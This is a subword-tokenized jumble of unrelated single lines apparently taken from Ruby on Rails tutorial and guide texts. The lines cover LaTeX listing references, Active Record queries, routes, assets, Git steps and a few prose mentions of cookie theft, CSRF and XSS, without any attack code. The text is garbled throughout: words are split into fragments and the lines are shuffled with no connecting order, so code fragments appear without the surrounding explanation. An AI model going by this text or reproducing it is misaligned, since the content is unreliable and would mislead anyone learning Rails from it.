▁Fin ally , ▁if ▁you ▁\ emph { do } ▁end ▁up ▁using ▁a ▁third - part y ▁system ▁later ▁on , ▁you ' ll ▁be ▁in ▁a ▁much ▁better ▁position ▁to ▁understand ▁and ▁modify ▁it ▁if ▁you ' ve ▁first ▁built ▁one ▁yourself .
▁ Asset ▁directories
▁* ▁` active _ record ▖ set _ config s ` ▁Set s ▁up ▁Active ▁Record ▁by ▁using ▁the ▁settings ▁in ▁` config ▖ active _ record ` ▁by ▁` send ` ' ing ▁the ▁method ▁names ▁as ▁set ter s ▁to ▁` ActiveRecord :: Base ` ▁and ▁passing ▁the ▁values ▁through .
▁By ▁default ,╼ this ▁means ▁the ▁files ▁in ▁` app / assets ` ▁take ▁precedence , ▁and ▁will ▁m as k ╼ c or respond ing ▁paths ▁in ▁` lib ` ▁and ▁` vendor ` .
▁# ▁</ hash >
▁Choos e ▁meaning ful ▁examples ▁that ▁ de p ic t ▁and ▁cover ▁the ▁basic s ▁as ▁well ▁as ▁inter est ing ▁point s ▁or ▁ got cha s .
▁The ▁other ▁possibility , ▁\ k ode { collection }, ▁works ▁without ▁the ▁id , ▁so ▁that
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ index _ tests } .
▁In ▁Chapter ~\ ref { cha : user _ microposts }, ▁the ▁result ▁was ▁only ▁a ▁ proto - feed ▁( Figure ~\ ref { fig : home _ with _ proto _ feed _ 3 r d _ edition }), ▁but ▁with ▁the ▁implementation ▁in ▁Listing ~\ ref { code : from _ users _ followed _ by _ final } ▁as ▁seen ▁in ▁Figure ~\ ref { fig : home _ page _ with _ feed } ▁the ▁Home ▁page ▁now ▁shows ▁the ▁full ▁feed .
▁En j o y !
▁We ▁accomplish ▁this ▁with ▁the ▁\ k ode { hidden \_ field \_ tag } ▁method ▁in ▁Listing ~\ ref { code : follow _ form }, ▁which ▁produce s ▁HTML ▁of ▁the ▁form
▁RESTful ▁routes ▁provided ▁by ▁the ▁custom ▁rules ▁in ▁resource ▁in ▁Listing ~\ ref { code : following _ followers _ action s _ routes } .
▁* ▁`: status `
▁En s ur ing ▁that ▁Rails ▁throw s ▁errors ▁on ▁invalid ▁ mass ▁assignment .
▁We ▁associate ▁to ▁each ▁user ▁a ▁remember ▁token ▁and ▁a ▁corresponding ▁remember ▁digest ▁for ▁use ▁in ▁ persistent ▁sessions .
▁# ▁ rspec - rails .
▁We ' ll ▁take ▁a ▁quick ▁ de tour ▁in ▁Chapter ~\ ref { cha : rails _ flavored _ ruby } ▁to ▁learn ▁a ▁little ▁about ▁the ▁Ruby ▁language ▁under ly ing ▁Rails .
▁( You ▁may ▁see ▁some ▁extra ▁things , ▁like ▁\ k ode { ? body = 1 }, ▁after ▁the ▁CSS ▁filename s .
▁In ▁this ▁case , ▁we ▁can ▁test ▁the ▁result ▁of ▁calling
▁will ▁now ▁run ▁the ▁four ▁of ▁them ▁in ▁turn .
▁Bootstrap ▁CSS ▁supports ▁styling ▁for ▁four ▁such ▁flash ▁classes ▁(\ k ode { success }, ▁\ k ode { info }, ▁\ k ode { warning }, ▁and ▁\ k ode { danger }), ▁and ▁we ' ll ▁find ▁ o cc as ion ▁to ▁use ▁all ▁of ▁them ▁in ▁the ▁course ▁of ▁developing ▁the ▁sample ▁application .
▁ rm d ir ▁< directory >
▁In ▁addition , ▁we ' ll ▁include ▁a ▁ ra s ter ▁of ▁small er ▁user ▁profile ▁image ▁links ▁in ▁the ▁ sidebar .
▁We ▁can ▁configure ▁our ▁production ▁application ▁to ▁use ▁SSL ▁for ▁secure ▁communicat ion s ▁and ▁ Puma ▁for ▁high ▁perform ance .
▁1▖ month ▖ from _ now
▁### ▁Sep ar ate ▁ Asset s ▁& ▁P re compiling
▁As ▁discuss ed ▁in ▁more ▁ de p th ▁in ▁Section ~\ ref { sec : prerequisites }, ▁web ▁development ▁is ▁a ▁challenging ▁subject , ▁es pecially ▁for ▁complete ▁beginners .
▁### ▁P ar ent s
▁Fin ally , ▁as ▁a ▁security ▁pre c a u tion , ▁we ' ll ▁test ▁for ▁a ▁length ▁validation ▁on ▁passwords , ▁ requiring ▁that ▁they ▁be ▁at ▁least ▁ s i x ▁characters ▁long :
▁The ▁only ▁way ▁to ▁explicitly ▁not ▁use ▁the ▁connection ▁information ▁in ▁` ENV [' DAT A BASE _ URL ']` ▁is ▁to ▁specify ▁an ▁explicit ▁URL ▁connection ▁using ▁the ▁` " url " ` ▁sub ▁key :
▁More ▁reading :
▁def ▁ authenticate ( controller , ▁& login _ procedure )
▁def ▁re write _ path ( options )
▁ ╼\ end { code }╼╼ ▁% ▁subsection ▁hashes _ and _ symbols ▁( end )╼╼ ▁\ subsection { CSS ▁ revisited } ▁% ▁( fold )╼ ▁\ label { sec : css _ revisited }╼╼
▁P lease ▁don ' t ▁put ▁" feature ▁request " ▁ items ▁into ▁GitHub ▁ Issue s ▖
▁### ▁S end ing ▁E mail s ▁with ▁D y na m ic ▁ Delivery ▁ Options
▁ SELECT ▁* ▁FROM ▁clients ▁LIMIT ▁5
▁"2010-07-27 ▁23:42:00 "▖ to _ time (: local ) ▁# ▁=> ▁Tue ▁Ju l ▁ 27 ▁23:42:00 ▁+0200 ▁2010
▁* ▁` ActionDispatch :: Callbacks ▖ after ` ▁take s ▁a ▁block ▁of ▁code ▁to ▁run ▁after ▁the ▁request .
▁Or , ▁in ▁English : ▁" return ▁all ▁articles ▁that ▁have ▁a ▁ category ▁and ▁at ▁least ▁one ▁comment "▖
▁$ ▁bin / rails ▁generate ▁model ▁ Comment ▁article _ id : integer ▁text : text
▁( We ' ll ▁see ▁con c re te ▁examples ▁of ▁the ▁magic ▁columns ▁starting ▁in ▁Section ~\ ref { sec : creating _ user _ objects } ▖)
▁This ▁code ▁returns ▁a ▁version ▁of ▁the ▁\ k ode { params } ▁hash ▁with ▁only ▁the ▁ permitted ▁attributes ▁( w h ile ▁ ra is ing ▁an ▁error ▁if ▁the ▁\ k ode { : user } ▁attribute ▁is ▁missing ) .
▁This ▁option ▁is ▁best ▁suite d ▁for ╼ one - line rs .
▁# ▁=> ▁[" cannot ▁contain ▁the ▁characters ▁ !
▁C RE A TE ▁T A B LE ▁ products ▁(
▁< div ▁id =" error _ explanation ">
▁In ▁the ▁previous ▁example ▁the ▁ macro ▁generates ▁` avatar _ size ` ▁rather ▁than ▁` size ` .
▁te }╼╼ ▁% ▁section ▁ sass _ and _ the _ asset _ pipeline ▁( end )╼╼ ▁\ section { L a y out ▁links } ▁% ▁( fold )╼ ▁\ label { sec : layout _ links }╼╼ N o w ▁that ▁we ' ve ▁ finished ▁a ▁site ▁layout ▁with ▁d ec ent ▁styling , ▁it ' s ▁time ▁to ▁start ▁ filling ▁in ▁the ▁links ▁we ' ve ▁ stub b ed ▁out ▁with ▁\ k ode { ' \ # ' } ▖
▁* ▁` _ product ▖ html ▖ erb `
▁If ▁you ▁choose ▁to ▁use ▁ MySQL ▁and ▁are ▁using ▁JRuby , ▁your ▁` config / database ▖ yml ` ▁will ▁look ▁a ▁little ▁different ▖
▁When ▁you ▁are ▁defin ing ▁an ▁attribute ▁in ▁a ▁class ▁that ▁is ▁mean t ▁to ▁be ▁sub class ed , ▁name ▁co ll is ion s ▁are ▁a ▁risk ▖
▁### ▁` errors ▖ size `
▁class ▁Create As se mb li es A nd Part s ▁< ▁ActiveRecord :: Migration
▁This ▁section ▁has ▁placed ▁rather ▁heav y ▁d em and s ▁on ▁your ▁data ▁ modeling ▁ s kill s , ▁and ▁it ' s ▁fine ▁if ▁it ▁take s ▁a ▁while ▁to ▁so a k ▁in .
▁When ▁we ▁allow ▁users ▁to ▁log ▁in ▁to ▁the ▁sample ▁app ▁starting ▁in ▁Chapter ~\ ref { cha : sign _ up }, ▁we ▁will ▁need ▁to ▁find ▁the ▁user ▁record ▁corresponding ▁to ▁the ▁submitted ▁email ▁address .
▁CSS ▁for ▁the ▁`` remember ▁me '' ▁checkbox .
▁S el ec ting ▁ Specific ▁ Fi el d s
▁As ▁with ▁the ▁\ k ode { user \_ id }, ▁the ▁\ k ode { content } ▁attribute ▁must ▁be ▁present , ▁and ▁it ▁is ▁further ▁constrain ed ▁to ▁be ▁no ▁longer ▁than ▁ 140 ▁characters , ▁making ▁it ▁an ▁h one st ▁\ emph { micro } post .
▁These ▁examples ▁don ' t ▁do ▁any ▁ha rm ▁so ▁far , ▁so ▁let ' s ▁see ▁how ▁an ▁attacker ▁can ▁steal ▁the ▁user ' s ▁cookie ▁( and ▁thus ▁ hijack ▁the ▁user ' s ▁session )▖
▁This ▁works ▁fine ▁and , ▁because ▁they ▁are ▁actually ▁\ emph { called } ▁using ▁\ k ode { User ▖ new \_ token } ▁and ▁\ k ode { User ▖ digest }, ▁it ▁is ▁ probably ▁the ▁clear est ▁way ▁to ▁define ▁them .
▁# ▁=> ▁#< Client ▁id : ▁1, ▁first _ name : ▁" Lifo ">
▁* ▁` config ▖ action _ view ▖ logger ` ▁accept s ▁a ▁ logger ▁con form ing ▁to ▁the ▁interface ▁of ▁ Log 4 r ▁or ▁the ▁default ▁Ruby ▁ Logger ▁class , ▁which ▁is ▁then ▁used ▁to ▁log ▁information ▁from ▁Action ▁View ▖
▁This ▁means ▁` Time ▖ now ▖ to _ date ` ▁may ▁equal ▁` Date ▖ yesterday ` .
▁| ▁DELETE ▁| ▁ / comments / : id (▖ : format ) ▁| ▁comments # destroy ▁| ▁ sekret _ comment _ path ▁|
▁as ▁show n ▁in ▁Listing ~\ ref { code : password _ reset _ form } .
▁The ▁`: debug ` ▁option ▁is ▁red un d an t ▁if ▁debug ▁mode ▁is ▁already ▁on .
▁Listing ~\ ref { code : development _ email _ settings } ▁uses ▁a ▁host ▁name ▁of ▁\ k ode { ' example ▖ com ' }, ▁but ▁you ▁should ▁use ▁the ▁actual ▁host ▁of ▁your ▁development ▁environment .
▁The ▁Micropost ▁model ▁needs ▁only ▁two ▁attributes : ▁a ▁\ k ode { content } ▁attribute ▁to ▁hold ▁the ▁micropost ' s ▁content ▁and ▁a ▁\ k ode { user \_ id } ▁to ▁associate ▁a ▁micropost ▁with ▁a ▁particular ▁user .
▁S up po se ▁you ' ve ▁made ▁some ▁accidental ▁changes , ▁such ▁as ▁( D ' o h ! ) ▁ deleting ▁the ▁ critical ▁\ k ode { app / controllers / } ▁directory :
▁The ▁new ▁method , ▁` update `, ▁is ▁used ▁when ▁you ▁want ▁to ▁update ▁a ▁record ╼ that ▁already ▁exists , ▁and ▁it ▁accept s ▁a ▁hash ▁containing ▁the ▁attributes ╼ that ▁you ▁want ▁to ▁update ▖
▁If ▁you ▁are ▁using ▁Windows , ▁go ▁to ▁\ href { http :// rails install er ▖ org /}{ Rails ▁In st all er } ▁and ▁ download ▁the ▁Rails ▁In st all er ▁execut able ▁and ▁view ▁the ▁excellent ▁installation ▁ video .
▁When ▁a ▁controller ▁or ▁a ▁scaffold ▁is ▁generated ▁with ▁the ▁default ▁Rails ▁gem set , ▁a ╼ CoffeeScript ▁file ▁and ▁a ▁ SCSS ▁file ▁are ▁generated ▁in ▁place ▁of ▁a ▁regular ▁JavaScript ╼ and ▁CSS ▁file ▖
▁In ▁particular , ▁\ k ode { Rails ▖ env ▖ development ?}\ ▁is ▁\ k ode { true } ▁only ▁in ▁a ▁development ▁environment , ▁so ▁the ▁ Embedded ▁Ruby
▁O p en ▁` app / controllers / articles _ controller ▖ rb ` ▁and ▁change ▁the ▁` create ` ▁action ▁to ╼ lo o k ▁like ▁this :
▁The ▁\ k ode { edit } ▁action ▁for ▁password ▁reset .
▁### ▁` select _ all `
▁# ▁Instead ▁of ▁this
▁#### ▁ J o in ing ▁N est ed ▁Associations ▁( M ultiple ▁L e ve l )
▁A li ce ▁sign s ▁up ▁for ▁the ▁sample ▁app , ▁with ▁address ▁ al ice @ w on d er l and ▖ com .
▁The ▁signup ▁form ▁is ▁now ▁live , ▁and ▁the ▁result ▁of ▁a ▁successful ▁signup ▁is ▁show n ▁in ▁Figure ~\ ref { fig : signup _ in _ production } .
▁At ▁this ▁point , ▁if ▁you ▁are ▁using ▁Git , ▁you ▁should ▁merge ▁your ▁changes ▁back ▁into ▁the ▁master ▁branch :
▁So , ▁given :
▁belongs _ to ▁: order
▁</ tr >
▁One ▁test ▁should ▁fail .
▁# ▁config / environments / test ▖ rb
▁The ▁corresponding ▁route ▁helper ▁would ▁be ▁` publish er _ magazine _ photo _ url `, ▁ requiring ▁you ▁to ▁specify ▁objects ▁at ▁all ▁three ▁level s ▖
▁By ▁not ▁writing ▁the ▁same ▁information ▁over ▁and ▁over ╼ ▁again , ▁our ▁code ▁is ▁more ▁maintain able , ▁more ▁ ext en s ible , ▁and ▁less ▁bug g y .
▁HTML ▁ color s ▁can ▁be ▁code d ▁with ▁three ▁pair s ▁of ▁base - 16 ▁( h ex ad ec im al ) ▁number s , ▁one ▁each ▁for ▁the ▁primary ▁ color s ▁red , ▁green , ▁and ▁b l ue ▁( in ▁that ▁order ) .
▁We ▁can ▁replace ▁this ▁in ▁Sass ▁with
▁See ▁the ▁next ▁section ▁for ╼ information ▁on ▁ compiling ▁local ly .
▁ NoMethodError : ▁undefined ▁method ▁` reverse ' ▁for ▁: foobar : Symbol
▁It ' s ▁convenient ▁to ▁model ▁sessions ▁as ▁a ▁RESTful ▁resource : ▁visit ing ▁the ▁login ▁page ▁will ▁render ▁a ▁form ▁for ▁\ emph { new } ▁sessions , ▁logging ▁in ▁will ▁\ emph { create } ▁a ▁session , ▁and ▁logging ▁out ▁will ▁\ emph { destroy } ▁it .
▁* ▁ Symbol s .
▁# ▁perform ▁sophisticat ed ▁change
▁You ▁may ▁note ▁that , ▁unlike ▁the ▁ demo ▁Users ▁and ▁Microposts ▁controllers ▁from ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁the ▁Static ▁Pages ▁controller ▁does ▁not ▁use ▁the ▁standard ▁REST ▁actions .
▁There ▁are ▁a ▁few ▁major ▁changes ▁related ▁to ▁JSON ▁handling ▁in ▁Rails ▁4▖1 .
▁Note ▁the ▁leading ▁ underscore ▁on ▁the ▁filename ▁\ k ode { \_ shim ▖ html ▖ erb } ; ▁this ▁ underscore ▁is ▁the ▁ universal ▁convention ▁for ▁naming ▁partials , ▁and ▁a mong ▁other ▁things ▁make s ▁it ▁possible ▁to ▁identify ▁all ▁the ▁partials ▁in ▁a ▁directory ▁at ▁a ▁g l ance .
▁With ▁the ▁test ▁data ▁thus ▁prepar ed , ▁the ▁test ▁itself ▁is ▁fai r ly ▁straightforward : ▁we ▁visit ▁the ▁user ▁profile ▁page ▁and ▁check ▁for ▁the ▁page ▁title ▁and ▁the ▁user ' s ▁name , ▁Gravatar , ▁micropost ▁count , ▁and ▁ paginate d ▁microposts .
▁As ▁you ▁can ▁see ▁above ▁the ▁` default _ scope ` ▁is ▁being ▁merge d ▁in ▁both ╼` scope ` ▁and ▁` where ` ▁conditions .
▁exist ▁config
▁#### # ▁ Conditional ▁Layouts
▁To ▁set ▁up ▁your ▁CDN ▁you ▁have ▁to ▁have ▁your ▁application ▁running ▁in ▁production ▁on ╼ the ▁inter net ▁at ▁a ▁public ally ▁available ▁URL , ▁for ▁example ▁` example ▖ com ` ▖
▁#### ▁L im it s ▁to ▁N est ing
▁Even ▁though ▁Active ▁Record ▁let s ▁you ▁specify ▁conditions ▁on ▁the ▁ eager ▁loaded ▁associations ▁just ▁like ▁` joins `, ▁the ▁recommended ▁way ▁is ▁to ▁use ▁[ joins ](# join ing - table s ) ▁instead .
▁The ▁method ▁` beginning _ of _ minute ` ▁returns ▁a ▁timestamp ▁at ▁the ▁beginning ▁of ▁the ▁ minute ▁( h h : m m :00 ) :
▁We ' ll ▁be ▁using ▁the ▁ factor ies ▁generated ▁by ▁\ href { http :// github ▖ com / thoughtbot / factory _ g ir l } { Factory ▁Girl }, ▁a ▁Ruby ▁gem ▁produce d ▁by ▁the ▁good ▁people ▁at ▁\ href { http :// thoughtbot ▖ com /}{ thoughtbot } .
▁* ▁Controller - level ▁validations ▁can ▁be ▁te mp ting ▁to ▁use , ▁but ▁often ▁become ╼ ▁un w i el d y ▁and ▁difficult ▁to ▁test ▁and ▁maintain ▖
▁D ue ▁to ▁the ▁way ▁Active ▁Record ▁interpret s ▁parameters ▁in ▁combination ▁with ▁the ▁way ╼ that ▁Rack ▁ parse s ▁query ▁parameters ▁it ▁was ▁possible ▁to ▁issue ▁un expect ed ▁database ╼ q u er ies ▁with ▁` IS ▁NULL ` ▁where ▁clause s ▖
▁Ruby ▁on ▁Rails ▁uses ▁[ GitHub ▁ Issue ▁T rack ing ]( https :// github ▖ com / rails / rails / issue s ) ▁to ▁ track ▁issues ▁( p ri ma ri ly ▁bug s ▁and ▁con t ri but ion s ▁of ▁new ▁code )▖
▁The ▁next ▁key , ▁`: format s ` ▁specifie s ▁the ╼ format ▁of ▁template ▁to ▁be ▁served ▁in ▁response ▖
▁In ▁particular , ▁it ▁does ▁\ emph { not } ▁pull ▁all ▁the ▁microposts ▁out ▁of ▁the ▁database ▁and ▁then ▁call ▁\ k ode { length } ▁on ▁the ▁result ing ▁array , ▁as ▁this ▁could ▁become ▁in efficient ▁as ▁the ▁number ▁of ▁microposts ▁g re w .
▁There ▁are ▁many ▁ mostly ▁equivalent ▁possibilities --- essentially , ▁any ▁long ▁random ▁string ▁will ▁do .
▁As ▁mentioned ▁above , ▁it ' s ▁also ▁possible ▁to ▁a b and on ▁your ▁topic ▁branch ▁\ line break ▁changes , ▁in ▁this ▁case ▁with ▁\ k ode { git ▁branch ▁- D } :
▁render ▁plain : ▁params [: article ] ▖ inspect
▁As ▁in ▁Section ~\ ref { sec : layout _ link _ tests }, ▁we ' ll ▁use ▁\ k ode { assert \_ select } ▁to ▁test ▁HTML ▁elements ▁of ▁the ▁relevant ▁pages , ▁tak ing ▁care ▁to ▁check ▁only ▁elements ▁unlike ly ▁to ▁change ▁in ▁the ▁future .
▁require ▁' active _ support / core _ ext / object '
▁This ▁can ▁lead ▁to ▁false ▁redirect ion , ▁XSS ▁or ▁HTTP ▁response ▁ split ting .
▁Whi le ▁a ▁b us y ▁production ▁environment ▁may ▁over load ▁SQLite , ▁it ▁works ▁well ▁for ▁development ▁and ▁testing ▖
▁WARNING : ▁Note ▁that ▁in ▁that ▁case ▁` parent _ name ` ▁returns ▁` nil ` .
▁end _ of _ week ▁( at _ end _ of _ week )
▁customer _ name : ▁" John ▁Doe ")
▁# ▁# ▁=> ▁< label ▁for =" article _ title "> A ▁short ▁title </ label >
▁Extensions ▁to ▁` Range `
▁No ▁static ▁pages ▁( such ▁as ▁`` Home '' ▁or ▁`` About '')
▁orphan ▖ reachable ?
▁=> ▁" The ▁D u de "
▁The ▁initial ▁index ▁page ▁for ▁the ▁Users ▁resource ▁(\ href { http :// localhost :3000/ users }{/ users }) ▖ ~\ href { http :// railstutorial ▖ org / images / figures / demo _ blank _ user _ index _ rails _ 3- full ▖ png }{( full ▁size )}
▁ Default ▁scope s ▁are ▁no ▁longer ▁overrid d en ▁by ▁ chain ed ▁conditions .
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : test _ helper _ sessions }, ▁we ▁can ▁ assert ▁that ▁the ▁user ▁is ▁logged ▁in ▁after ▁signup ▁using ▁the ▁line ▁show n ▁in ▁Listing ~\ ref { code : login _ after _ signup _ test } .
▁A ▁Bitbucket ▁repository ▁page .
▁More over , ▁since ▁we ' ll ▁be ▁using ▁email ▁addresses ▁as ▁unique ▁user name s ▁when ▁users ▁log ▁in , ▁we ▁should n ' t ▁allow ▁email ▁duplicate s ▁in ▁the ▁database .
▁* ▁` config ▖ i 18 n ▖ default _ locale ` ▁set s ▁the ▁default ▁ locale ▁of ▁an ▁application ▁used ▁for ▁i 18 n ▖
▁* ▁` before _ eager _ load `: ▁This ▁is ▁run ▁directly ▁before ▁ eager ▁loading ▁occur s , ▁which ▁is ▁the ▁default ▁behavior ▁for ▁the ▁` production ` ▁environment ▁and ▁not ▁for ▁the ▁` development ` ▁environment .
▁# ▁ delegate s ▁to ▁the ▁Rails ▁constant
▁You ▁may ▁be ▁able ▁to ▁guess ▁the ▁code ▁for ▁enforc ing ▁a ▁\ k ode { minimum } ▁length ▁constraint ▁by ▁refer r ing ▁to ▁the ▁corresponding ▁\ k ode { maximum } ▁validation ▁for ▁the ▁user ' s ▁name ▁( Listing ~\ ref { code : length _ validation }) :
▁The ▁association ▁defined ▁in ▁Listing ~\ ref { code : has _ many _ following _ through _ active _ relationships } ▁lead s ▁to ▁a ▁powerful ▁combination ▁of ▁Active ▁Record ▁and ▁array - like ▁behavior .
▁( As ▁we ' ll ▁see ▁in ▁detail ▁starting ▁in ▁Chapter ~\ ref { cha : modeling _ users }, ▁this ▁user ▁data ▁is ▁store d ▁in ▁a ▁database ▁back - end ▖)
▁# ▁You ▁can ▁have ▁the ▁root ▁of ▁your ▁site ▁route d ▁with ▁" root "
▁### ▁Other ▁ Security ▁Consider ation s
▁As ▁prepar ation ▁for ▁adding ▁dynamic ▁pages ▁to ▁our ▁sample ▁application , ▁now ▁is ▁a ▁good ▁time ▁to ▁add ▁some ▁debug ▁information ▁to ▁our ▁site ▁layout ▁( Listing ~\ ref { code : rails _ debug }) .
▁### ▁` exclusion `
▁<%= ▁render ▁partial : ▁" product ", ▁collection : ▁@ products ▁%>
▁Here ' s ▁a ▁ patch ed ▁version ▁of ▁the ▁method :
▁@ current _ user ▖ special ? ▁?
▁<% ▁@ articles ▖ each ▁do ▁| article | ▁%>
▁This ▁method ▁is ▁also ▁alias ed ▁as ▁` get utc ` .
▁We ' ll ▁start ▁with ▁a ▁basic ▁version ▁good ▁enough ▁for ▁development ▁use , ▁and ▁then ▁add ▁a ▁series ▁of ▁ en h ance ment s ▁to ▁make ▁image ▁upload ▁production - read y .
▁Then ▁merge ▁the ▁changes ▁back ▁into ▁the ▁master ▁branch ▁using ▁the ▁same ▁technique ▁as ▁in ▁Section ~\ ref { sec : git _ commands }
▁We ' ve ▁come ▁a ▁long ▁way ▁in ▁this ▁chapter : ▁installation , ▁development ▁environment ▁setup , ▁version ▁control , ▁and ▁deployment .
▁### ▁N a m ing ▁ Convention s
▁#### ▁options _ from _ collection _ for _ select
▁#### ▁ atom _ feed
▁Having ▁show n ▁how ▁to ▁create , ▁show , ▁and ▁edit ▁users , ▁we ▁come ▁finally ▁to ▁destroying ▁them ▁( Figure ~\ ref { fig : demo _ destroy _ user _ rails _3} ) .
▁The ▁other ▁new ▁method ▁is ▁\ k ode { any ?} , ▁which ▁( to get her ▁with ▁\ k ode { empty ? }) ▁is ▁one ▁of ▁a ▁pair ▁of ▁complement ary ▁methods :
▁Recall ▁from ▁Listing ~\ ref { code : hello _ root _ route } ▁that ▁we ▁changed
▁They ▁ tr an s l ate ▁to ▁calls ▁to ▁` since ` ▁or ▁` advance ` ▖
▁( Because ▁of ▁the ▁email ▁downcas ing ▁callback ▁in ▁Listing ~\ ref { code : email _ downcase }, ▁this ▁will ▁ never ▁make ▁a ▁difference ▁in ▁this ▁tutorial , ▁but ▁it ' s ▁a ▁good ▁practice ▁in ▁case ▁the ▁\ k ode { gravatar \_ for } ▁ever ▁get s ▁used ▁on ▁email ▁addresses ▁from ▁other ▁source s ▖)
▁* ▁The ▁basic s ▁of ▁Ajax .
▁Now ▁the ▁ demo ▁application ▁should ▁be ▁ready ▁to ▁go ▁at ▁\ href { http :// localhost :3000/ } { http :// localhost :3000/ } .
▁Additional ▁layer s ▁of ▁pre process ing ▁can ▁be ▁request ed ▁by ▁adding ▁other ▁extensions ,╼ where ▁each ▁extension ▁is ▁processed ▁in ▁a ▁right - to - le f t ▁ man n er ▖
▁* ▁` update !
▁yield (: new s _ content ) ▁: ▁yield ▁%>
▁### ▁Configur ing ▁ Middleware
▁ Math ▖ qualified _ const _ get (" E ") ▁# ▁=> ▁2▖ 7 18 28 18 28 4 59 04 5
▁The ▁` test ` ▁directory ▁is ▁where ▁tests ▁for ▁the ▁engine ▁will ▁go ▖
▁This ▁will ▁generate ▁the ▁following ▁things :
▁The ▁" Welcome ▁a board " ▁page ▁is ▁the ▁ _ s m o k e ▁test _ ▁for ▁a ▁new ▁Rails ▁application : ▁it ╼ make s ▁sure ▁that ▁you ▁have ▁your ▁software ▁configured ▁correctly ▁enough ▁to ▁serve ▁a ╼ page ▖
▁S ince ▁we ' re ▁about ▁to ▁add ▁the ▁ability ▁to ▁create ▁new ▁users ▁through ▁the ▁web , ▁let ' s ▁remove ▁the ▁user ▁created ▁at ▁the ▁console ▁in ▁Section ~\ ref { sec : creating _ a _ user } .
▁Before ▁we ▁saw ▁\ k ode { split } ▁convert ▁a ▁string ▁to ▁an ▁array .
▁as ▁show n ▁in ▁Listing ~\ ref { code : edit _ tests _ signed _ in } .
▁This ▁address ▁tell s ▁the ▁computer ▁to ▁list en ▁on ▁every ▁available ▁ IP ▁address ▁configured ▁on ▁that ▁specific ▁machine ; ▁in ▁particular , ▁we ▁can ▁view ▁the ▁application ▁using ▁the ▁special ▁address ▁\ k ode { 1 27 ▖ 0 ▖ 0 ▖ 1 }, ▁which ▁is ▁also ▁known ▁as ▁\ k ode { localhost } .
▁In ▁case ▁you ▁need ▁a ▁ dummy ▁Rails ▁app ▁to ▁test ▁changes , ▁the ▁`-- dev ` ▁flag ▁of ▁` rails ▁new ` ▁generates ▁an ▁application ▁that ▁uses ▁your ▁local ▁branch :
▁The ▁controller ' s ╼ class ▁is ▁defined ▁within ▁the ▁` Blorgh ` ▁module :
▁Article ▖ includes (: comments )▖ where ( comments : ▁ { ▁ visible : ▁true ▁ })
▁In ▁the ▁case ▁of ▁a ▁user ' s ▁microposts , ▁we ▁would ▁have ▁this :
▁These ▁options ▁take ▁either ▁a ▁method ▁name , ▁or ▁an ▁array ▁of ▁method ▁names , ▁corresponding ▁to ▁method ▁names ▁within ▁the ▁controller :
▁end { enumerate }╼╼ ▁% ▁subsection ▁a _ class _ of _ our _ own ▁( end )╼╼ ▁\ subsection { Mo d if y ing ▁built - in ▁classes } ▁% ▁( fold )╼ ▁\ label { sec : modify ing _ built _ in _ classes }╼╼
▁The ▁subsequent ▁code ▁creates ▁an ▁empty ▁example ▁user ▁and ▁then ▁fill s ▁in ▁the ▁name ▁and ▁email ▁address ▁by ▁assign ing ▁directly ▁to ▁the ▁corresponding ▁attributes ▁( assignment s ▁made ▁possible ▁by ▁the ▁\ k ode { attr \_ accessor } ▁line ▁in ▁Listing ~\ ref { code : example _ user }) .
▁To ▁get ▁started ▁with ▁static ▁pages , ▁we ' ll ▁first ▁generate ▁a ▁controller ▁using ▁the ▁same ▁Rails ▁\ k ode { generate } ▁ script ▁we ▁used ▁in ▁Chapter ~\ ref { cha : a _ toy _ app } ▁to ▁generate ▁scaffold ing .
▁If ▁you ▁run ▁into ▁problem s ▁at ▁Heroku , ▁make ▁sure ▁to ▁take ▁a ▁look ▁at ▁the ▁production ▁log s ▁to ▁try ▁to ▁di a g no se ▁the ▁problem :
▁The ▁updated ▁versions ▁are ▁show n ▁in ▁Listing ~\ ref { code : signup _ errors _ updated }, ▁Listing ~\ ref { code : password _ reset _ updated }, ▁and ▁Listing ~\ ref { code : edit _ errors _ updated } .
▁# ▁becomes
▁This ▁terminology ▁is ▁wrong ▁because ▁by ▁design ▁encrypt ion ▁is ▁\ emph { reversible } --- the ▁ability ▁to ▁encrypt ▁implie s ▁the ▁ability ▁to ▁\ emph { de crypt } ▁as ▁well .
▁A nother ▁problem ▁for ▁the ▁worm ' s ▁author ▁were ▁CSRF ▁security ▁token s ▖
▁The ▁solution ▁( re mov ing ▁the ▁fixture ▁contents ▁as ▁in ▁Listing ~\ ref { code : empty _ fixtures }) ▁is ▁also ▁the ▁same ▁( Listing ~\ ref { code : empty _ relationship _ fixture }) .
▁ queue _ as ▁: default
▁The ▁Help ▁page ▁with ▁HTML ▁structure ▁removed ▖
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / hash / except ▖ rb ` .
▁ Example s ▁of ▁authentication ▁and ▁ authorization ▁systems ▁include ▁\ href { http :// github ▖ com / thoughtbot / clear ance } { C le ar ance }, ▁\ href { http :// github ▖ com / bin ary log ic / authlogic } { A u th log ic }, ▁\ href { http :// github ▖ com / plat a format ec / devise } { Devise }, ▁and ▁\ href { http :// r ailscasts ▖ com / episodes /1 92 - authorization - with - can can } { C an C an } ▁( as ▁well ▁as ▁non - Rails - specific ▁solution s ▁built ▁on ▁to p ▁of ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / O p en ID } { O p en ID } ▁or ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / O a u th } { O A u th }) .
▁By ▁out putting ▁`@ article ▖ author ` ▁using ▁the ▁` <%= ` ▁tag , ▁the ▁` to _ s ` ▁method ▁will ▁be ╼ called ▁on ▁the ▁object ▖
▁As ▁a ▁result ▁of ▁its ▁use ▁of ▁\ k ode { pluralize }, ▁the ▁code
▁Recall ▁from ▁the ▁discussion ▁in ▁Section ~\ ref { sec : account _ activation _ mailer } ▁that ▁the ▁activation ▁token ▁and ▁email ▁are ▁available ▁as ▁\ k ode { params [: id ]} ▁and ▁\ k ode { params [: email ]} , ▁respectively .
▁i ▖ name ▁= ▁' J one s '
▁ body ▁i 18 n ▖ t ▁: body , ▁user _ name : ▁user ▖ name
▁The ▁result ing ▁layout ▁appears ▁in ▁Listing ~\ ref { code : application _ layout } .
▁in ▁Listing ~\ ref { code : _ close _ browser } .
▁As ▁the ▁`: host ` ▁usually ▁is ▁consistent ▁a cross ▁the ▁application ▁you ▁can ▁configure ▁it ╼ global ly ▁in ▁` config / application ▖ rb `:
